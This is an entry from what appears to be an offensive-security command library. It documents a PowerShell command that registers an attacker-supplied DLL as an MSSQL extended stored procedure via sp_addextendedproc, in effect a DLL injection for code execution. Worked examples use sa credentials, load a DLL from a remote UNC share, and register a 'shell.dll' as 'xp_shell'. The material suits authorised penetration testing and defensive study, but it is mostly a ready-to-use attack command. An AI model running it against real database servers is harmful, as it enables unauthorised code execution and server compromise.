---
id: b40dc3c4-3a7a-4e6f-9390-747f513c84a6
name: load-dll-as-extended-procedure
type: command
executor: powershell
data: >-
  Get-SQLQuery -UserName $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE"
  -Query "sp_addextendedproc '$_PROC_NAME', '$_DLL_PATH'"
output: null
created_at: '2023-04-06T03:56:20.295423+00:00'
updated_at: '2023-04-10T20:36:30.722000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - injection
verified: true
validated: true
---

# load-dll-as-extended-procedure

## Command

```powershell
Get-SQLQuery -UserName $_USERNAME -Password $_PASSWORD -Instance "$_INSTANCE" -Query "sp_addextendedproc '$_PROC_NAME', '$_DLL_PATH'"
```

## Description

This command executes a SQL query to register a DLL as an extended stored procedure on the target MSSQL instance using sp_addextendedproc.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| -UserName ($__USERNAME) | SQL Server username (e.g., sa) | Yes |
| -Password ($__PASSWORD) | SQL Server password | Yes |
| -Instance ($__INSTANCE) | Target SQL Server instance (e.g., DBSERVERNAME\SQLEXPRESS) | Yes |
| -Query | The SQL command to add the procedure | Built-in |
| $_PROC_NAME | Name of the new procedure (e.g., xp_test) | Yes |
| $_DLL_PATH | UNC or local path to the DLL (e.g., \\10.10.0.1\temp\test.dll) | Yes |

## Examples

### Basic Usage

```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "DBSERVERNAME\SQLEXPRESS" -Query "sp_addextendedproc 'xp_test', '\\10.10.0.1\temp\test.dll'"
```

### Advanced Usage

```powershell
Get-SQLQuery -UserName sa -Password Password1234 -Instance "DBSERVERNAME\SQLEXPRESS" -Query "sp_addextendedproc 'xp_shell', 'C:\temp\shell.dll'"
```

## Expected Output

SQL execution result: "Command(s) completed successfully." If errors occur (e.g., invalid path), it returns SQL error messages like "Cannot find the object 'xp_test' because it does not exist."

## Related

- [[procedures/mssql-server-extended-stored-procedure-dll-injection]]
- [[commands/execute-extended-stored-procedure-xp-test]]
